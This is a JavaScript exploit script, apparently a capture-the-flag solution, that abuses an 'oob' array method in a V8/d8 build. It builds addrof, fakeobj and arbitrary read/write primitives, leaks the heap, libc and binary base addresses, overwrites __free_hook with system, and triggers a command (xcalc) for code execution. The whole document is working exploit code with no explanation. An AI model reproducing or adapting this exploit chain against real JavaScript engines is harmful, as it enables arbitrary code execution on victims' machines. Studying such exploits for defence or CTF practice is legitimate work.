var buf=new ArrayBuffer(8);
var f64_buf=new Float64Array(buf);
var u64_buf=new BigUint64Array(buf);

function ftoi(val){
    f64_buf[0]=val;
    return u64_buf[0];
}

function itof(val){
    u64_buf[0]=val;
    return f64_buf[0];
}

var temp_obj={"A":1};
var obj_arr=[temp_obj];
var float_arr=[1.1, 1.2];
var obj_arr_map=obj_arr.oob();
var float_arr_map=float_arr.oob();

function addrof(in_obj){
    obj_arr[0]=in_obj;
    obj_arr.oob(float_arr_map);
    let leak=obj_arr[0];
    obj_arr.oob(obj_arr_map);
    return ftoi(leak);
}

function fakeobj(addr){
    float_arr[0]=itof(addr);
    float_arr.oob(obj_arr_map);
    let fake=float_arr[0];
    float_arr.oob(float_arr_map);
    return fake;
}

var arb_rw_arr=[float_arr_map,1.2,1.3,1.4];

function arb_read(addr){
    if(addr%2n==0){
        addr+=1n;
    }
    let fake=fakeobj(addrof(arb_rw_arr)-0x20n);
    arb_rw_arr[2]=itof(addr-0x10n);
    return ftoi(fake[0]);
}

function initial_arb_write(addr,val){
    if(addr%2n==0){
        addr+=1n;
    }
    let fake=fakeobj(addrof(arb_rw_arr)-0x20n);
    arb_rw_arr[2]=itof(addr-0x10n);
    fake[0]=itof(val);
}

function arb_write(addr,val){
    let array_buf=new ArrayBuffer(8);
    let dataview_buf=new DataView(array_buf,0,8);
    let array_buf_addr=addrof(array_buf);
    let backing_store_addr=array_buf_addr+0x20n;
    initial_arb_write(backing_store_addr,addr);
    dataview_buf.setBigUint64(0,val,true);
}

obj_arr_offset=0x2f79n
heap_offset=0x10n
heap_leak_offset=0x8f480n
var heap_base=arb_read(ftoi(obj_arr_map)-0x2f69n)-0x8f480n;
console.log("[+] Heap base = 0x"+heap_base.toString(16));
var libc_base=arb_read(heap_base+0x1418n)-0x3ec680n;
console.log("[+] Libc base = 0x"+libc_base.toString(16));
var binary_base=arb_read(heap_base+0x1300n)-0xd807b8n;
console.log("[+] Binary base = 0x"+binary_base.toString(16));
libc_free_hook=libc_base+0x3ed8e8n
libc_system=libc_base+0x4f550n
arb_write(libc_free_hook,libc_system);
console.log("xcalc\x00");
